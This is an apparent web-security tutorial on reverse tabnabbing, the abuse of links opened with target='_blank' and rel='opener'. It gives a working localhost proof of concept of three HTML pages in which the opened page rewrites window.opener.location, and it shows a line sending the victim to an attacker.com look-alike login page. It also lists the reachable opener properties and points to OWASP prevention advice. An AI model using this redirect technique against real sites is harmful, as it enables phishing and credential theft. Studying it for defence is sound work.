# Reverse Tab Nabbing
In a situation where an attacker can control the `href` argument of an `<a` tag with the attribute `target="_blank" rel="opener"` that is going to be clicked by a victim, the attacker point this link to a web under his control (a malicious website). Then, once the victim clicks the link and access the attackers website, this malicious website will be able to control the original page via the javascript object window.opener.

If the page doesn't have `rel="opener"` but contains `target="_blank"` it also doesn't have `rel="noopener"` it might be also vulnerable.

A regular way to abuse this behaviour would be to change the location of the original web via `window.opener.location = https://attacker.com/victim.html` to a web controlled by the attacker that looks like the original one, so it can imitate the login form of the original website and ask for credentials to the user.


## Overview
### With back link

Link between parent and child pages when prevention attribute is not used:

<img src="https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/b80ac8ef-2c88-427b-b80f-a4d8b573c589" width="700" height="500">


### Without back link

Link between parent and child pages when prevention attribute is used:

<img src="https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/12be0bae-81cd-4902-9d4c-083041098574" width="700" height="500">

## How to exploit
Create the following pages in a folder and run a web server with `python3 -m http.server`

Then, access `http://127.0.0.1:8000/vulnerable.html`, click on the link and note how the original website URL changes.

```html
vulnerable.html
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```


```html
malicious.html
<!DOCTYPE html>
<html>
 <body>
  <script>
  window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
  </script>
 </body>
</html>
```


```html
malicious_redir.html
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```

### Accessible properties
The malicious site can only access to the following properties from the opener javascript object reference (that is in fact a reference to a window javascript class instance) in case of cross origin (cross domains) access:

* `opener.closed`: Returns a boolean value indicating whether a window has been closed or not.
* `opener.frames`: Returns all iframe elements in the current window.
* `opener.length`: Returns the number of iframe elements in the current window.
* `opener.opener`: Returns a reference to the window that created the window.
* `opener.parent`: Returns the parent window of the current window.
* `opener.self`: Returns the current window.
* `opener.top`: Returns the topmost browser window.

If the domains are the same then the malicious site can access all the properties exposed by the [window](https://developer.mozilla.org/en-US/docs/Web/API/Window) javascript object reference.

## Prevention
Prevention information are documented into the [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#tabnabbing).







